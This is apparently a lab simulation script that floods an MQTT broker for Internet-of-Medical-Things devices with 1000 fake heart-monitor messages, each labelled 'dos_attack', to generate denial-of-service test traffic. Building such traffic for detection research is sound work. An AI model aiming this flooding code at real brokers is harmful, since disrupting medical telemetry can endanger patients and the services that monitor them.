import json
import os
import time
from datetime import datetime, UTC

import paho.mqtt.client as mqtt


def get_broker_host():
    return os.getenv("BROKER_HOST", "localhost")


BROKER_HOST = get_broker_host()
BROKER_PORT = 1883
TOPIC = "iomt/devices"

client = mqtt.Client()
client.connect(BROKER_HOST, BROKER_PORT, 60)
client.loop_start()

for i in range(1000):
    data = {
        "device_id": "HRM001",
        "patient_id": "P001",
        "device_type": "heart_monitor",
        "value": 80,
        "unit": "bpm",
        "timestamp": datetime.now(UTC).isoformat(),
        "status": "dos_attack"
    }

    result = client.publish(TOPIC, json.dumps(data))
    result.wait_for_publish()

print("DOS ATTACK SENT: 1000 messages")

time.sleep(1)
client.loop_stop()
client.disconnect()